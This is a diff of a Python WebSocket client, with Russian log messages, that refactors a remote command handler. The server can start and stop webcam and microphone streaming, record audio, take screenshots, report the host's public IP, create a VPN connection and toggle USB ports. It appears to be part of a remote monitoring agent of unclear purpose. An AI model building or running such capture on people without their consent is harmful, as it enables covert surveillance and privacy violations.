@@ -1,3 +1,5 @@
+# client/client/network/ws_client.py
+
 import json
 import time
 import threading
@@ -15,15 +17,13 @@ logger = setup_logger()
 ws_lock = threading.Lock()
 ws_active = False
 
-# Для управления состоянием видео и аудио, импортируем глобальные переменные из соответствующих модулей.
-# Например, из video_service.py и audio_service.py:
-from client.services.video_service import streaming_active
+# Импортируем переменные состояния (их можно перенести в централизованный модуль управления)
+import client.services.video_service as video_service
 from client.services.audio_service import mic_streaming_active
 
 def send_ip_via_ws(ws):
     try:
-        import requests
-        response = requests.get("https://api.ipify.org?format=json", timeout=10)
+        response = __import__("requests").get("https://api.ipify.org?format=json", timeout=10)
         ip = response.json().get("ip")
         logger.info(f"Получен публичный IP: {ip}")
         ws.send("ip:" + ip)
@@ -33,15 +33,15 @@ def send_ip_via_ws(ws):
 def on_message(ws, message):
     global mic_streaming_active, streaming_active
     logger.info(f"Получена команда: {message}")
-    cmd = message.lower()
-    if cmd == "stop":
-        streaming_active = False
-        logger.info("Видео трансляция остановлена командой сервера.")
-    elif cmd == "start":
-        streaming_active = True
+    cmd = message.lower().strip()
+    if cmd == "start":
+        video_service.streaming_active = True
         logger.info("Видео трансляция запущена командой сервера.")
+    elif cmd == "stop":
+        video_service.streaming_active = False
+        logger.info("Видео трансляция остановлена командой сервера.")
     elif cmd == "send_ip":
-        logger.info("Отправка данных по IP по команде сервера.")
+        logger.info("Отправка IP по команде сервера.")
         send_ip_via_ws(ws)
     elif cmd == "screenshot":
         take_screenshot()
@@ -49,23 +49,23 @@ def on_message(ws, message):
         collect_and_send_metrics(ws)
     elif cmd == "mic_start":
         mic_streaming_active = True
-        logger.info("Трансляция микрофона запущена командой сервера.")
+        logger.info("Микротрансляция запущена командой сервера.")
     elif cmd == "mic_stop":
         mic_streaming_active = False
-        logger.info("Трансляция микрофона остановлена командой сервера.")
+        logger.info("Микротрансляция остановлена командой сервера.")
     elif cmd == "record_audio":
-        logger.info("Запись аудио по команде сервера.")
+        logger.info("Запуск записи аудио по команде сервера.")
         threading.Thread(target=record_audio_snippet, daemon=True).start()
     elif cmd == "vpn_create":
         logger.info("Создание VPN подключения по команде сервера.")
         threading.Thread(target=create_vpn_connection, daemon=True).start()
     elif cmd == "usb_on":
         logger.info(f"Проверка прав администратора: {is_admin()}")
-        logger.info("Запрос на включение USB портов.")
+        logger.info("Включение USB портов.")
         enable_usb_ports()
     elif cmd == "usb_off":
         logger.info(f"Проверка прав администратора: {is_admin()}")
-        logger.info("Запрос на отключение USB портов.")
+        logger.info("Отключение USB портов.")
         disable_usb_ports()
 
 def on_error(ws, error):
